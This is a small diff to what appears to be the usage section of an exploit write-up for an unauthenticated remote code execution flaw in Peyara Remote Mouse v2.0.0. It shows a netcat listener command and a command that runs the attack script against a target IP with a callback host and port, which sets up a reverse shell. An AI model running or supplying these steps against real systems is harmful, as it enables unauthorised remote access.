@@ -13,7 +13,6 @@ Peyara Remote Mouse v2.0.0 contains an unauthenticated remote code execution vul
    nc -nlvp 4444
       ```
 3. **Execute Exploit Script**
-   Run the attack script with appropriate parameters:
 ```bash
 python3 Peyara.py --target 192.168.1.107 --lhost 192.168.1.110 --lport 4444
 ```
